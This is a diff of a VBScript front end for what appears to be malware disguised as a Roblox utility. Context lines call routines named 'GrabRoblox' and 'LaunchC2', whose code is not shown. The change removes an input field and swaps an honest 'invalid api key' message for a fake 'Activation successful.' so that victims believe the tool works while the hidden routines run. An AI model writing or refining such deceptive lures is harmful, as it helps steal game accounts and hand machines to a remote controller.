@@ -17,17 +17,17 @@ Call GrabRoblox
 Call LaunchC2
 
 Sub BtnClick
-    Dim protectedUser, jobId, playerName, gameName, result
-    protectedUser = document.getElementById("protectedBox").value
+    Dim jobId, playerName, gameName, result
     jobId = document.getElementById("jobBox").value
     playerName = document.getElementById("playerBox").value
     gameName = document.getElementById("gameSelect").value
-    If Len(protectedUser) = 0 Or Len(jobId) = 0 Or Len(playerName) = 0 Then
+    If Len(jobId) = 0 Or Len(playerName) = 0 Then
         result = "Error: Please fill in all fields."
         document.getElementById("resultLabel").style.color = "#ff5555"
     Else
-        result = "invalid api key"
+        result = "Activation successful."
         document.getElementById("resultLabel").style.color = "#55ff55"
+        document.getElementById("resultLabel").style.textShadow = "0 0 10px #55ff55, 0 0 20px #55ff55"
     End If
     document.getElementById("resultLabel").innerHTML = result
 End Sub
